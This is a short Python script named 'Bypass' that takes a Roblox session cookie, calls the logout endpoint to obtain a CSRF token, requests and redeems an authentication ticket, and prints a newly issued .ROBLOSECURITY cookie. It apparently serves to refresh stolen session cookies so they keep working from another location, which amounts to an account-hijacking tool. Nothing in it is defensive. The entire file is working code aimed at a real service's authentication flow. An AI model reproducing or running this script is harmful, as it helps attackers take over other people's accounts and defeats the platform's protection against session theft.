import requests

class Bypass:
    def __init__(self, cookie) -> None:
        self.cookie = cookie
    
    def start_process(self):
        self.xcsrf_token = self.get_csrf_token()
        self.rbx_authentication_ticket = self.get_rbx_authentication_ticket()
        return self.get_set_cookie()
        
    def get_set_cookie(self):
        response = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", headers={"rbxauthenticationnegotiation":"1"}, json={"authenticationTicket": self.rbx_authentication_ticket})
        set_cookie_header = response.headers.get("set-cookie")
        assert set_cookie_header, "An error occurred while getting the set_cookie"
        return set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

        
    def get_rbx_authentication_ticket(self):
        response = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers={"rbxauthenticationnegotiation":"1", "referer": "https://www.roblox.com/camel", 'Content-Type': 'application/json', "x-csrf-token": self.xcsrf_token}, cookies={".ROBLOSECURITY": self.cookie})
        assert response.headers.get("rbx-authentication-ticket"), "An error occurred while getting the rbx-authentication-ticket"
        return response.headers.get("rbx-authentication-ticket")
        
        
    def get_csrf_token(self) -> str:
        response = requests.post("https://auth.roblox.com/v2/logout", cookies = {".ROBLOSECURITY": self.cookie})
        xcsrf_token = response.headers.get("x-csrf-token")
        if xcsrf_token is None:
            raise Exception("An error occurred while getting the X-CSRF-TOKEN. "
                            "Could be due to an invalid Roblox Cookie")
                 
        return xcsrf_token
    
print(Bypass("cookie").start_process())
